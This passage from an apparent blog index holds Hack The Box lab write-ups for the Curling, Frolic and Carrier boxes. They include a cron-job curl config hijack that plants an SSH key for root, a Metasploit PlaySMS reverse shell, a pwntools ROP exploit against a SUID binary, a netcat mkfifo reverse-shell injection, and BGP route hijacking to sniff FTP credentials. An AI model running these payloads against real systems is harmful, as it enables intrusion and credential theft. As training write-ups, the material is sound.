....)p..000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.000000f0: 819b bb48                                ...HThis appears to be a bzip2 file but we need to put it back in binary format first, we’ll use CyberChef for this:We just hit the Save to output file icon to download the download.dat file in binary format.Confirmed, this is a bzip2 file:root@ragingunicorn:~/Downloads# file download.datdownload.dat: bzip2 compressed data, block size = 900kLet’s decompress it…root@ragingunicorn:~/Downloads# bzip2 -d download.datbzip2: Can't guess original name for download.dat -- using download.dat.outroot@ragingunicorn:~/Downloads# file download.dat.outdownload.dat.out: gzip compressed data, was \"password\", last modified: Tue May 22 19:16:20 2018, from Unix, original size 141Geez, another compressed file in it!root@ragingunicorn:~/Downloads# mv download.dat.out download.gzroot@ragingunicorn:~/Downloads# gunzip download.gzroot@ragingunicorn:~/Downloads# file downloaddownload: bzip2 compressed data, block size = 900kNow, this is just dumb…root@ragingunicorn:~/Downloads# mv download password.bz2root@ragingunicorn:~/Downloads# bzip2 -d password.bz2root@ragingunicorn:~/Downloads# file passwordpassword: POSIX tar archive (GNU)Let’s keep going.root@ragingunicorn:~/Downloads# tar xvf password.tarpassword.txtroot@ragingunicorn:~/Downloads# cat password.txt5d&lt;wdCbdZu)|hChXllFinally!We can su to user floris now and get the user flag.python3 -c 'import pty;pty.spawn(\"/bin/sh\")'$ su -l florissu -l florisPassword: 5d&lt;wdCbdZu)|hChXllfloris@curling:~$ cat user.txtcat user.txt65dd1d...floris@curling:~$PrivescFirst, let’s upload our ssh key so we don’t have to rely on that meterpreter shell:floris@curling:~$ mkdir .sshmkdir .sshfloris@curling:~$ echo \"ssh-rsa AAAAB...DhscPOtelvd root@ragingunicorn\" &gt; .ssh/authorized_keys&lt;cPOtelvd root@ragingunicorn\" &gt; .ssh/authorized_keysIn admin-area folder, there are two files with a timestamp that keeps refreshing every few minutes:floris@curling:~/admin-area$ ls -latotal 12drwxr-x--- 2 root   floris 4096 May 22 19:04 .drwxr-xr-x 7 floris floris 4096 Oct 27 20:39 ..-rw-rw---- 1 root   floris   25 Oct 27 20:40 input-rw-rw---- 1 root   floris    0 Oct 27 20:40 reportfloris@curling:~/admin-area$ dateSat Oct 27 20:40:44 UTC 2018There is probably a cron job running as root, let’s confirm this by running a simple ps command in a bash loop:floris@curling:~/admin-area$ while true; do ps waux | grep report | grep -v \"grep --color\"; doneroot      9225  0.0  0.0   4628   784 ?        Ss   20:44   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportroot      9227  0.0  0.4 105360  9076 ?        S    20:44   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportroot      9225  0.0  0.0   4628   784 ?        Ss   20:44   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportroot      9227  0.0  0.4 105360  9076 ?        S    20:44   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportroot      9225  0.0  0.0   4628   784 ?        Ss   20:44   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportroot      9227  0.0  0.4 105360  9076 ?        S    20:44   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportroot      9225  0.0  0.0   4628   784 ?        Ss   20:44   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportroot      9227  0.0  0.4 105360  9076 ?        S    20:44   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportAs suspected, a cronjob executes curl using a input config file which we can write to.We will change the file to fetch our SSH public key and save it into root’s authorized_keys file:floris@curling:~/admin-area$ echo -ne 'output = \"/root/.ssh/authorized_keys\"\\nurl = \"http://10.10.14.23/key.txt\"\\n' &gt; inputfloris@curling:~/admin-area$ cat inputoutput = \"/root/.ssh/authorized_keys\"url = \"http://10.10.14.23/key.txt\"When the cronjob runs, it fetches our public key:root@ragingunicorn:~/htb/curling# python -m SimpleHTTPServer 80Serving HTTP on 0.0.0.0 port 80 ...10.10.10.150 - - [27/Oct/2018 16:52:56] \"GET /key.txt HTTP/1.1\" 200 -We can now SSH in as root:root@ragingunicorn:~# ssh root@curling.htbWelcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-22-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Sat Oct 27 20:47:15 UTC 2018  System load:  0.13              Processes:            181  Usage of /:   46.3% of 9.78GB   Users logged in:      1  Memory usage: 22%               IP address for ens33: 10.10.10.150  Swap usage:   0%  =&gt; There is 1 zombie process.0 packages can be updated.0 updates are security updates.Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Tue Sep 25 21:56:22 2018root@curling:~# cat root.txt82c198..."
  },
  
  {
    "title": "Frolic - Hack The Box",
    "url": "/posts/htb-writeup-frolic/",
    "categories": "hackthebox, infosec",
    "tags": "metasploit, esoteric language, ctf, rop, buffer overflow, binary exploitation",
    "date": "2019-03-23 00:00:00 +0800",
    





    
    "snippet": "Frolic had a pretty straightforward user access part where after minimal enumeration we could find the password for the PlaySMS application obfuscated a couple of times with some esoteric languages...",
    "content": "Frolic had a pretty straightforward user access part where after minimal enumeration we could find the password for the PlaySMS application obfuscated a couple of times with some esoteric languages and other things. The PlaySMS application which we could access with the password was directly exploitable from Metasploit without any effort.The priv esc had a buffer overflow in a SUID binary that we had to exploit using a ROP gadget from the libc library. I discovered the very cool one_gadget tool while doing this box.Quick summary  PlaySMS is installed and vulnerable to a bug which we can exploit with Metasploit (needs to be authenticated)  The credentials for PlaySMS are found in an encrypted zip file, which is encoded in Brainfuck, obfuscated in some random directory, then further obfuscated with Ook esoteric programming language  The priv esc is a SUID binary which we can ROP with one_gadget (ASLR is disabled)Tools used  OOK! Language decoder  Brainfuck Language decoder  one_gadgetNmapThe enumeration shows Node-RED, an Nginx server on a non-standard port, Samba and SSH.# Nmap 7.70 scan initiated Sat Oct 13 15:01:02 2018 as: nmap -p- -sC -sV -oA frolic 10.10.10.111Nmap scan report for frolic.htb (10.10.10.111)Host is up (0.018s latency).Not shown: 65530 closed portsPORT     STATE SERVICE     VERSION22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)1880/tcp open  http        Node.js (Express middleware)|_http-title: Node-RED9999/tcp open  http        nginx 1.10.3 (Ubuntu)|_http-server-header: nginx/1.10.3 (Ubuntu)|_http-title: Welcome to nginx!Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: -1h55m33s, deviation: 3h10m31s, median: -5m33s|_nbstat: NetBIOS name: FROLIC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)|   Computer name: frolic|   NetBIOS computer name: FROLIC\\x00|   Domain name: \\x00|   FQDN: frolic|_  System time: 2018-10-14T00:26:00+05:30| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2018-10-13 14:56:00|_  start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Oct 13 15:01:34 2018 -- 1 IP address (1 host up) scanned in 32.59 secondsNode-REDThere’s a Node-RED server running on port 1880 but when we try to log in with the admin / password credentials it just hangs and times out.Nginx webserverThe default nginx page is shown.Next, we’ll dirbust the site.root@ragingunicorn:~# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -u http://frolic.htb:9999=====================================================Gobuster v2.0.0              OJ Reeves (@TheColonial)=====================================================[+] Mode         : dir[+] Url/Domain   : http://frolic.htb:9999/[+] Threads      : 50[+] Wordlist     : /usr/share/seclists/Discovery/Web-Content/big.txt[+] Status codes : 200,204,301,302,307,403[+] Timeout      : 10s=====================================================2018/10/13 15:03:06 Starting gobuster=====================================================/.htpasswd (Status: 403)/.htaccess (Status: 403)/admin (Status: 301)/backup (Status: 301)/dev (Status: 301)/loop (Status: 301)/test (Status: 301)=====================================================2018/10/13 15:03:19 Finished=====================================================The /admin link contains a login form:All the authentication is done client-side with javascript code. Looking at the source code we can see the password: superduperlooperpassword_lolvar attempt = 3; // Variable to count number of attempts.// Below function Executes on click of login button.function validate(){var username = document.getElementById(\"username\").value;var password = document.getElementById(\"password\").value;if ( username == \"admin\" &amp;&amp; password == \"superduperlooperpassword_lol\"){alert (\"Login successfully\");window.location = \"success.html\"; // Redirecting to other page.return false;}else{attempt --;// Decrementing by one.alert(\"You have left \"+attempt+\" attempt;\");// Disabling fields after 3 attempts.if( attempt == 0){document.getElementById(\"username\").disabled = true;document.getElementById(\"password\").disabled = true;document.getElementById(\"submit\").disabled = true;return false;}}}We don’t even need to log in, we can browse to success.html directly.The page contains some kind of ciphertexthis is actually an esoteric programming language: Ook!We can use dcode.fr to find the plaintext.Nothing here check /asdiSIAJJ0QWE9JASThis contains yet another encoded blob of text:UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA When we base64 decode it, we see the PKZIP magic bytes PK.root@ragingunicorn:~/frolic# base64 -d stuff.b64PK     É7M#[i   index.phpUT     |[|[ux                                      ^DJsh)root@ragingunicorn:~/frolic# base64 -d stuff.b64 &gt; stuff.zipThe zip file is encrypted, after the first guess I found the password is password:root@ragingunicorn:~/frolic# unzip stuff.zipArchive:  stuff.zip[stuff.zip] index.php password:  inflating: index.phpMore encoded text…root@ragingunicorn:~/frolic# cat index.php4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0aThe following is the Brainfuck esoteric programming language:+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ +.--- --.++ +++++ .&lt;+++ [-&gt;++ +&lt;]&gt;+++.&lt;+ ++[-&gt; ---&lt;] &gt;---- --.-- ----- .&lt;+++ +[-&gt;+ +++&lt;] &gt;+++. &lt;+++[ -&gt;---&lt;]&gt;-- .&lt;+++ [-&gt;++ +&lt;]&gt;+ .---. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. &lt;++++ [-&gt;++ ++&lt;]&gt;++..&lt; Again, we use dcode.fr to find the plaintext:idkwhatispassPlaySMS and shell accessThe http://frolic.htb:9999/dev/backup/ link contains a reference to /playsmsThe playSMS application seems to be installed on the server:We can log in using admin / idkwhatispass.We have two potential vulnerabilities we can use with Metasploit:root@ragingunicorn:~/frolic# searchsploit playsmsPlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution (Metasploit)             | exploits/php/remote/44598.rbPlaySMS 1.4 - '/sendfromfile.php' Remote Code Execution / Unrestricted File Upload             | exploits/php/webapps/42003.txtPlaySMS 1.4 - 'import.php' Remote Code Execution                                               | exploits/php/webapps/42044.txtPlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Metasploit)         | exploits/php/remote/44599.rbWe can use the playsms_uploadcsv_exec module to get a shell:msf exploit(multi/http/playsms_uploadcsv_exec) &gt; show optionsModule options (exploit/multi/http/playsms_uploadcsv_exec):   Name       Current Setting  Required  Description   ----       ---------------  --------  -----------   PASSWORD   idkwhatispass    yes       Password to authenticate with   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]   RHOST      10.10.10.111     yes       The target address   RPORT      9999             yes       The target port (TCP)   SSL        false            no        Negotiate SSL/TLS for outgoing connections   TARGETURI  /playsms         yes       Base playsms directory path   USERNAME   admin            yes       Username to authenticate with   VHOST                       no        HTTP server virtual hostPayload options (php/meterpreter/reverse_tcp):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  10.10.14.23      yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen portExploit target:   Id  Name   --  ----   0   PlaySMS 1.4msf exploit(multi/http/playsms_uploadcsv_exec) &gt; run[*] Started reverse TCP handler on 10.10.14.23:4444[+] Authentication successful: admin:idkwhatispass[*] Sending stage (37775 bytes) to 10.10.10.111[*] Meterpreter session 3 opened (10.10.14.23:4444 -&gt; 10.10.10.111:52952) at 2018-10-13 17:12:46 -0400meterpreter &gt; shellProcess 1785 created.Channel 0 created.whoamiwww-dataFound user flag:cd /homels -ltotal 8drwxr-xr-x 3 ayush ayush 4096 Sep 25 02:00 ayushdrwxr-xr-x 7 sahay sahay 4096 Sep 25 02:45 sahaycd ayushcat user.txt2ab959...Priv escFound our priv esc vector here: /home/ayush/.binary/ropwww-data@frolic:~$ find / -perm /4000 2&gt;/dev/nullfind / -perm /4000 2&gt;/dev/null/sbin/mount.cifs/bin/mount/bin/ping6/bin/fusermount/bin/ping/bin/umount/bin/su/bin/ntfs-3g/home/ayush/.binary/ropThere’s obviously a buffer overflow in the binary, as shown below:www-data@frolic:~$ /home/ayush/.binary/rop/home/ayush/.binary/rop[*] Usage: program &lt;message&gt;www-data@frolic:~$ /home/ayush/.binary/rop AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASegmentation fault (core dumped)Luckily, ASLR is disabled on the server (0 = disabled):www-data@frolic:/home/ayush$ cat /proc/sys/kernel/randomize_va_spacecat /proc/sys/kernel/randomize_va_space0We can use netcat to copy the rop binary file to our own box and analyze it with gdb/gef:gef➤  checksec[+] checksec for '/root/frolic/rop'Canary                        : NoNX                            : YesPIE                           : NoFortify                       : NoRelRO                         : PartialNX is enabled so we won’t be able to execute a shellcode on the stack. But first things first, let’s find the offset for our overflow:root@ragingunicorn:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 128Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1AeWhen we crash the program, we see EIP is set to 0x62413762:We find the offset at position 52:root@ragingunicorn:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413762[*] Exact match at offset 52Next, we’ll look for gadgets in libc that we can use in our exploit. We’ll copy the libc file from the box to our own machine and use one_gadget:root@ragingunicorn:~/frolic# nc -lvnp 4444 &gt; libclistening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.111] 59480root@ragingunicorn:~/frolic# one_gadget -f libc rop0x3ac5c execve(\"/bin/sh\", esp+0x28, environ)constraints:  esi is the GOT address of libc  [esp+0x28] == NULLWe found a gadget at 0x3ac5c that’ll give us a nice shell!We also need libc’s base address (which doesn’t change since ASLR is disabled):www-data@frolic:/home/ayush$ ldd /home/ayush/.binary/ropldd /home/ayush/.binary/rop        linux-gate.so.1 =&gt;  (0xb7fda000)        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)        /lib/ld-linux.so.2 (0xb7fdb000)Base address is : 0xb7e19000To construct the final exploit, we write a simple script that’ll squash the $RIP register with the memory address of the gadget that spawns /bin/sh:from pwn import *payload = \"A\" * 52 + p32(0xb7e19000+0x3ac5c)print payloadWe can run the exploit locally to generate a payload file which we then transfer to the target system and pipe into the target binary:www-data@frolic:/dev/shm$ /home/ayush/.binary/rop $(cat payload)/home/ayush/.binary/rop $(cat payload)# cd /rootcd /root# cat root.txtcat root.txt85d3fd..."
  },
  
  {
    "title": "Carrier - Hack The Box",
    "url": "/posts/htb-writeup-carrier/",
    "categories": "hackthebox, infosec",
    "tags": "networking, lxc, containers, bgp, command injection, php, snmp, mitm",
    "date": "2019-03-16 00:00:00 +0800",
    





    
    "snippet": "I had the idea for creating Carrier after competing at the NorthSec CTF last year where there was a networking track that required the players to gain access to various routers in the network. I th...",
    "content": "I had the idea for creating Carrier after competing at the NorthSec CTF last year where there was a networking track that required the players to gain access to various routers in the network. I thought of re-using the same concept but add a MITM twist to it with BGP prefix hijacking. My initial version was much more complex and had DNS response poisoning in it. I eventually scaled it down because one part required using Scapy to craft packets from one of the container and I wasn’t sure if it’d work reliably with hundreds of people on the EU-Free server. I also didn’t want to lock people into using a specific tool or library from the container so I scrapped that part of Carrier.I tried to make the box somewhat realistic. It simulates some kind of network management &amp; ticketing system written in PHP. There is an online PDF manual that contains the description of some of the error codes displayed on the main page. Like many network devices, it contains a default SNMP community string public that allow users to query MIBs from the device, including the serial number used to log into the system. From there, there’s a trivial command injection that allow access to one of the ISP router.For the priv esc, I wanted to do something different so I used LXC containers to run 3 different routers, each simulating a different ISP with its own autonomous system number. Normally, ISPs should have policies in place to restrict what routes can be sent from a neighboring ISP. In this case, no such policies are configured and we can inject any route we want from AS100 where we have a foothold. To get the root flag, we need to sniff the FTP credentials of a user connecting to a remote server in AS300. I put a hint for the server IP in the ticket section of the website so people would have an idea what to do.The “intended solution” for this box was to inject a better route in the BGP table to redirect traffic through the R1 router where we could run a tcpdump capture and get the credentials. There’s a couple of ways to do that but injecting a more specific route is probably the simplest solution. We can’t just inject the more specific route and intercept the traffic because that same route is re-advertised from AS200 to AS300 and the later will insert the more specific route in its RIB. Even though AS300 is directly connect to 10.120.15.10, it won’t use the /24 from the local interface but instead prefer the more specific route coming from AS200 and cause the packets to loop between the two routers.The BGP routing protocol defines various “well-known” community attributes that must be supported by a BGP implementation. In this case, what we want to do is tell AS200 to send traffic to us but also tell it not to re-advertise the more specific route down to AS300. RFC1997 defines some of the standard attributes such as:NO_EXPORT (0xFFFFFF01)    All routes received carrying a communities attribute    containing this value MUST NOT be advertised outside a BGP    confederation boundary (a stand-alone autonomous system that    is not part of a confederation should be considered a    confederation itself).Using a route-map in the quagga’s Cisco-like CLI (vtysh), we can “tag” the routes sent to AS200 with the no-export policy and prevent the upstream router from re-advertising the route elsewhere. We also need to filter out that same route towards AS300 because we don’t want AS300 to insert the /25 route in its RIB.I think most people solved the box the easy way (nothing wrong with that) by changing the IP address of one of the interface on the R1 container and impersonate the FTP server to catch the connection from the FTP client and get the credentials. That further reinforces the point that not only is crypto important but verifying the identity of the server also is. Using only BGP route manipulation, it is possible to intercept the FTP session without changing any IP on the container.Quick summary  The /doc directory on the webserver has indexing enabled and contains documentation for the error codes on the login page  SNMP is configuration with the default public community string that allow us to retrieve the serial number of the box  One of the error code on the main page indicates that the password hasn’t been changed and that the serial number should be used to log in  There’s a hint on the ticket section of the webpage about an important server that we should get access to  The diagnostic section of the web page contains a command injection vulnerability that we can use to gain RCE  From the R1 router (container), we can perform a MITM attack by injecting a more specific route in the BGP table  We then intercept an FTP session and recover the credentials that let us log in as root and recover root.txtDetailed stepsPortscanWe’ll start by the standard nmap and find that there’s only two ports open on the server.root@violentunicorn:~# nmap -sC -sV -p- 10.10.10.105Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-12 01:46 EDTNmap scan report for 10.10.10.105Host is up (0.010s latency).Not shown: 65532 closed portsPORT   STATE    SERVICE VERSION21/tcp filtered ftp22/tcp open     ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA)|   256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)|_  256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)80/tcp open     http    Apache httpd 2.4.18 ((Ubuntu))| http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: LoginService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 19.09 secondsWeb enumerationThere’s a login page for some web application (this is a monitoring/ticketing system for a fictitious ISP).There are no default credentials or SQLi on this page.The error codes are interesting but we don’t know what they are yet (more on that later).Using gobuster, we find a couple of directories:root@ragingunicorn:~# gobuster -w /usr/share/dirb/wordlists/small.txt -t 10 -u 10.10.10.105=====================================================Gobuster v2.0.0              OJ Reeves (@TheColonial)=====================================================[+] Mode         : dir[+] Url/Domain   : http://10.10.10.105/[+] Threads      : 10[+] Wordlist     : /usr/share/dirb/wordlists/small.txt[+] Status codes : 200,204,301,302,307,403[+] Timeout      : 10s=====================================================2019/03/12 01:47:12 Starting gobuster=====================================================/css (Status: 301)/debug (Status: 301)/doc (Status: 301)/img (Status: 301)/js (Status: 301)/tools (Status: 301)=====================================================2019/03/12 01:47:13 Finished=====================================================The /debug directory is just a link to phpinfo()There’s a /tools directorry that contains a remote.php file but it doesn’t do anything because the license is expired:Inside the /doc directory there are two files:The diagram_for_tac.png file contains a network diagram showing 3 different BGP autonomous systems (the initial foothold is in AS100).The error_code.pdf file contains a list of error codes:If we cross reference the two codes from the main login page:  We see that the license is now invalid/expired  The default admin account uses the serial number of the device (which we don’t have yet)SNMP enumerationBy querying the box with the default public SNMP community string, we can find the serial number of the device. This type of information is often found in SNMP mibs on network devices.root@violentunicorn:~# snmp-check 10.10.10.105snmp-check v1.9 - SNMP enumeratorCopyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)[+] Try to connect to 10.10.10.105:161 using SNMPv1 and community 'public'[*] System information:  Host IP address               : 10.10.10.105  Hostname                      : -  Description                   : -  Contact                       : -  Location                      : -  Uptime snmp                   : -  Uptime system                 : -  System date                   : -root@violentunicorn:~# snmpwalk -v1 -c public 10.10.10.105iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: \"SN#NET_45JDX23\"End of MIBThe serial number is: NET_45JDX23We can now log in to the website using username admin and password NET_45JDX23.DashboardThe main dashboard page indicates that the system is in read-only mode since the license is expired.It also indicates that the router config will be reverted every 10 minutes (this is done on purpose to make sure we don’t lose access to the box if someone messes up the router configuration).TicketsThe tickets section contains a hint about what we need to do once we get access to the router (more on that in the next section)Ticket #6 contains the hint:  … one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 networkSo it seems that there’s something important on the 10.120.15.0/24 network. The ticket indicates the user is using the unencrypted FTP protocol so we’ll be able to sniff the credentials if we can redirect traffic through the router.Diagnostics command injectionBased on the output we see when we click on the Verify status button, we can see that it’s running ps grepped with quagga. It’s actually running the command on the r1 router since the web server builds an ssh connection to r1 first then runs the command there.The HTML on the diagnostics page contains a base64 encoded value in the check field:The hidden field cXVhZ2dh base64 decodes to quagga. We can control the grep parameter by modifying the check parameter in the HTTP POST request and gain code execution.For check, we will use the ; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 4444 &gt;/tmp/f value encoded in base64:We then get a reverse shell using netcat:root@violentunicorn:~# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.105] 48918/bin/sh: 0: can't access tty; job control turned off# python3 -c 'import pty;pty.spawn(\"/bin/bash\")'root@r1:~# ididuid=0(root) gid=0(root) groups=0(root)root@r1:~# lslstest_intercept.pcap  user.txtroot@r1:~# cat user.txtcat user.txt5649c4...BGP hijackingSo, there’s a user on AS200 connecting to a server on the 10.120.15.0/24 network (the server is 10.120.15.10, which is the IP address of the lxdbr1 interface on the host OS). We can’t initially see his traffic because the traffic is sent directly from AS200 to AS300 (we are on AS100).The idea is to inject a more specific routes for the 10.120.15.0/24 network so the r2 router will send traffic to us at r1. Then once we get the traffic we’ll send it back out towards r3 because we already have a BGP route from r3 for the 10.120.15.0/24 networkThere’s a small twist to this: when we send the more specific route (we can use a /25 or anything smaller than a /24), we must ensure that this route is not sent from r2 to r3 otherwise r3 will blackhole traffic towards the router since it received a more specific route. To do this, we can add the no-export BGP community to the route sent to r2, so the route won’t be re-advertised to other systems.We can see below that the best route for the  10.120.15.0/24 network is from AS 300 (10.78.11.2):root@r1:~# vtyshHello, this is Quagga (version 0.99.24.1).Copyright 1996-2005 Kunihiro Ishiguro, et al.r1# show ip bgp summshow ip bgp summBGP router identifier 10.255.255.1, local AS number 100RIB entries 53, using 5936 bytes of memoryPeers 2, using 9136 bytes of memoryNeighbor        V         AS MsgRcvd MsgSent   TblVer  InQ OutQ Up/Down  State/PfxRcd10.78.10.2      4   200       4       7        0    0    0 00:00:14       2210.78.11.2      4   300       4      10        0    0    0 00:00:11       22Total number of neighbors 2r1# show ip bgp 10.120.15.0/24show ip bgp 10.120.15.0/24BGP routing table entry for 10.120.15.0/24Paths: (2 available, best #1, table Default-IP-Routing-Table)  Advertised to non peer-group peers:  10.78.10.2  300    10.78.11.2 from 10.78.11.2 (10.255.255.3)      Origin IGP, metric 0, localpref 100, valid, external, best      Last update: Tue Jul  3 03:40:17 2018  200 300    10.78.10.2 from 10.78.10.2 (10.255.255.2)      Origin IGP, localpref 100, valid, external      Last update: Tue Jul  3 03:40:14 2018We’ll change the route-map to add no-export to routes sent to AS200, then advertise the 10.120.15.0/25 network:r1# conf tr1(config)# ip prefix-list leak permit 10.120.15.0/25r1(config)# !r1(config)# route-map to-as200 permit 10r1(config-route-map)# match ip address prefix-list leakr1(config-route-map)# set community no-exportr1(config-route-map)# !r1(config-route-map)# route-map to-as200 permit 20r1(config-route-map)# !r1(config-route-map)# route-map to-as300 deny 10r1(config-route-map)# match ip address prefix-list leakr1(config-route-map)# !r1(config-route-map)# route-map to-as300 permit 20r1(config-route-map)# !r1(config-route-map)# router bgp 100r1(config-router)# network 10.120.15.0 mask 255.255.255.128r1(config-router)# endr1#After changing the route-map, we can issue a clear ip bgp * out to refresh the outbound filter policies without resetting the entire BGP adjacency. We can see now that we are sending the /25 route towards AS200:r1# show ip bgp nei 10.78.10.2 advertised-routesBGP table version is 0, local router ID is 10.255.255.1Status codes: s suppressed, d damped, h history, * valid, &gt; best, = multipath,              i internal, r RIB-failure, S Stale, R RemovedOrigin codes: i - IGP, e - EGP, ? - incomplete   Network          Next Hop            Metric LocPrf Weight Path*&gt; 10.120.15.0/25   10.78.10.1               0         32768 iPacket capture FTP session to the server 10.120.15.10Since we have now injected a more specific route for the 10.120.15.0/24 network, AS200 will send traffic to us (AS100) when trying to reach 10.120.15.10. Then r1 will send the traffic back out eth2 towards AS300.We can sniff the traffic using tcpdump and we see that a user logs in to 10.120.15.10 using FTP, and we can see his credentials:root@r1:~# tcpdump -vv -s0 -ni eth2 -c 10 port 21tcpdump: listening on eth2, link-type EN10MB (Ethernet), capture size 262144 bytes[...]13:53:01.528076 IP (tos 0x10, ttl 63, id 11657, offset 0, flags [DF], proto TCP (6), length 63)    10.78.10.2.50692 &gt; 10.120.15.10.21: Flags [P.], cksum 0x2e03 (incorrect -&gt; 0x75af), seq 1:12\tUSER root[...]13:53:01.528248 IP (tos 0x10, ttl 63, id 11658, offset 0, flags [DF], proto TCP (6), length 74)    10.78.10.2.50692 &gt; 10.120.15.10.21: Flags [P.], cksum 0x2e0e (incorrect -&gt; 0xa290), seq 12:34\tPASS BGPtelc0rout1ngLogging to the server with root credentials and getting the system flagNote: We can log in directly from the HTB network to the box IP with the FTP credentials, but in this example we’ll log in from r1. We have to first enable an interactive pty so we can SSH.# python3 -c 'import pty;pty.spawn(\"/bin/bash\")'root@r1:~# ssh root@10.120.15.10root@10.120.15.10's password: BGPtelc0rout1ngWelcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-24-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage[...]root@carrier:~# 